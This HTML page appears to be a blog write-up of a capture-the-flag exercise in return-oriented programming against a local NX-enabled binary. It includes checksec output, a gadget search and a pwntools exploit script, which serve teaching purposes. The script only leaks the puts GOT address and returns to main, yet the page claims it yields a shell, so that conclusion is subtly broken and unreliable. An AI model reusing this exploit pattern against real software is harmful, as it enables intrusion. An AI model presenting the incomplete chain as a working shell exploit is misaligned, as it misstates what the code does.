<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pwn the Box - Advanced ROP | CyberSec Blog</title>
    <meta name="description" content="Exploiting a binary with NX enabled using Return Oriented Programming.">
    <link rel="stylesheet" href="../style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;800&display=swap"
        rel="stylesheet">
</head>

<body>
    <header>
        <nav>
            <a href="../index.html" class="logo">~/effect</a>
            <div class="nav-links">
                <a href="../index.html" class="">Home</a>
                <a href="../writeups/index.html" class="active">Writeups</a>
            </div>
        </nav>
    </header>

    <main>
        <div class='content'><h1>Pwn the Box - Advanced ROP</h1><p class='writeup-meta'>2023-11-15</p><h1>Analysis</h1>
<p>We start by checking the security mitigations on the binary.</p>
<pre><code>bash
checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>As we can see, <strong>NX is enabled</strong>, so we can't execute shellcode on the stack. We need to use <strong>ROP</strong>.</p>
<h2>Finding Gadgets</h2>
<p>We use `ROPgadget` to find useful gadgets.</p>
<pre><code>bash
ROPgadget --binary ./vuln --only "pop|ret"
</code></pre>
<p>We found a `pop rdi; ret` gadget at `0x4011bb`.</p>
<h2>Exploit</h2>
<p>Here is the final python script using `pwntools`:</p>
<pre><code>python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

p.sendline(b'A'*40 + rop.chain())
p.interactive()
</code></pre>
<p>Boom! We have a shell.</p></div>
    </main>

    <footer>
        <p>&copy; 2025 effect. Built with ü§ç.</p>
    </footer>
</body>

</html>